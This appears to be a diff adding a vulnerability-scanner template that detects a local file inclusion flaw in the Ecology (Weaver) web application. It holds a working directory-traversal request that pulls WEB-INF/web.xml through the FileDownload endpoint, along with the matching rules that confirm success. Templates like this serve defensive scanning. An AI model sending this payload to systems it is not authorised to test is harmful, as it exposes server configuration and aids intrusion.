@@ -1,0 +1,24 @@
+id: ecology-filedownload-directory-traversal
+brief:
+    title: Ecology - Local File Inclusion
+    by: princechaddha
+    level: high
+    about: Ecology is vulnerable to local file inclusion.
+    label:
+        - ecology
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <url-pattern>/weaver/
+          in: body
+          need: all
